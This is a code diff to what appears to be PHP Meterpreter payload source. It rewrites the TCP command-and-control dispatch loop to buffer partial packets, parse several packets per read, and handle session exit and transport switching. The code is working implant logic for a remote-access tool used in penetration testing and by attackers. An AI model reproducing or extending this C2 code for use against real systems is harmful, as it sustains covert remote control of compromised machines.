@@ -1585,6 +1585,9 @@ function activate_transport_with_retry(&$transport) {
 
 function dispatch_tcp(&$transport) {
   $msgsock = $transport['_socket'];
+  $c2_buffer = '';
+  $c2_packet_len = null;
+  $chunk_deadline = null;
   add_reader($msgsock);
   $r = $GLOBALS['readers'];
   $w = null; $e = null; $t = 1;
@@ -1597,49 +1600,72 @@ function dispatch_tcp(&$transport) {
       remove_reader($msgsock); close($msgsock);
       return DISPATCH_SWITCH;
     }
+    if ($chunk_deadline !== null && time() > $chunk_deadline) {
+      remove_reader($msgsock); close($msgsock);
+      return DISPATCH_RETIRE;
+    }
     for ($i = 0; $i < $cnt; $i++) {
       $ready = $r[$i];
       if ($ready == $msgsock) {
-        $packet = read($msgsock, 32);
-        if (false == $packet) {
+        # Only consume one bounded chunk per select() iteration so partially
+        # received C2 packets do not starve ready channel resources.
+        $chunk = read($msgsock, 8192, true);
+        if ($chunk === false) {
           remove_reader($msgsock); close($msgsock);
           return DISPATCH_RETIRE;
         }
-        $xor = substr($packet, 0, 4);
-        $header = xor_bytes($xor, substr($packet, 4, 28));
-        $len_array = unpack("Nlen", substr($header, 20, 4));
-        $len = $len_array['len'] + 32 - 8;
-        $chunk_deadline = time() + $transport['comm_timeout'];
-        while (strlen($packet) < $len) {
-          if (time() > $chunk_deadline
-              || empty($GLOBALS['running'])
-              || time() > $GLOBALS['session_expiry_end']
-              || $GLOBALS['next_transport_idx'] !== null) {
-            remove_reader($msgsock); close($msgsock);
-            return DISPATCH_RETIRE;
-          }
-          $chunk = read($msgsock, $len - strlen($packet));
-          if ($chunk === false) {
-            # false means the C2 socket closed mid-packet ('' is a normal empty read
-            # between TCP segments and must not retire the transport).
-            remove_reader($msgsock); close($msgsock);
-            return DISPATCH_RETIRE;
-          }
-          if ($chunk === '') {
-            # No data ready yet between TCP segments; yield briefly to reduce
-            # CPU spinning. Note: this does not return control to the outer
-            # select() — channel fairness during a C2 packet gap requires
-            # resumable packet assembly (tracked as a follow-up).
-            usleep(1000);
-            continue;
-          }
-          $packet .= $chunk;
-          # Refresh deadline on each successful chunk: comm_timeout limits
-          # inactivity, not total transfer time.
+        if ($chunk !== '') {
+          $c2_buffer .= $chunk;
+          # comm_timeout limits inactivity while a packet is incomplete, not
+          # the total time required to receive it.
           $chunk_deadline = time() + $transport['comm_timeout'];
         }
-        $response = create_response(decrypt_packet(xor_bytes($xor, $packet)));
-        write_tlv_to_socket($msgsock, $response);
+
+        # Parse every complete packet currently buffered. TCP may split a
+        # header across reads or combine multiple packets in a single read.
+        while (true) {
+          if ($c2_packet_len === null) {
+            if (strlen($c2_buffer) < 32) {
+              break;
+            }
+            $xor = substr($c2_buffer, 0, 4);
+            $header = xor_bytes($xor, substr($c2_buffer, 4, 28));
+            $len_array = unpack("Nlen", substr($header, 20, 4));
+            $c2_packet_len = $len_array['len'] + 32 - 8;
+
+            # A Meterpreter packet contains the 32-byte wire header at minimum.
+            if ($c2_packet_len < 32) {
+              remove_reader($msgsock); close($msgsock);
+              return DISPATCH_RETIRE;
+            }
+          }
+
+          if (strlen($c2_buffer) < $c2_packet_len) {
+            break;
+          }
+
+          $packet = substr($c2_buffer, 0, $c2_packet_len);
+          $c2_buffer = substr($c2_buffer, $c2_packet_len);
+          $c2_packet_len = null;
+          if ($c2_buffer === '') {
+            $chunk_deadline = null;
+          }
+
+          $xor = substr($packet, 0, 4);
+          $response = create_response(decrypt_packet(xor_bytes($xor, $packet)));
+          write_tlv_to_socket($msgsock, $response);
+
+          # A command can shut down the session or request a transport switch.
+          # Send its response on the old transport before changing state.
+          if (empty($GLOBALS['running']) || time() > $GLOBALS['session_expiry_end']) {
+            remove_reader($msgsock); close($msgsock);
+            return DISPATCH_EXIT;
+          }
+          if ($GLOBALS['next_transport_idx'] !== null) {
+            remove_reader($msgsock); close($msgsock);
+            return DISPATCH_SWITCH;
+          }
+        }
       } else {
         #my_print("not Msgsock: $ready");
         $chan_id = get_channel_id_from_resource($ready);
@@ -1950,7 +1976,7 @@ function close($resource) {
   return $ret;
 }
 
-function read($resource, $len=null) {
+function read($resource, $len=null, $single_read=false) {
   global $udp_host_map;
   # Max packet length is magic.  If we're reading a pipe that has data but
   # isn't going to generate any more without some input, then reading less
@@ -2031,7 +2057,7 @@ function read($resource, $len=null) {
           return false;
         }
         $buff .= $tmp;
-        if (strlen($tmp) < $len) {
+        if ($single_read || strlen($tmp) < $len) {
           break;
         }
       }
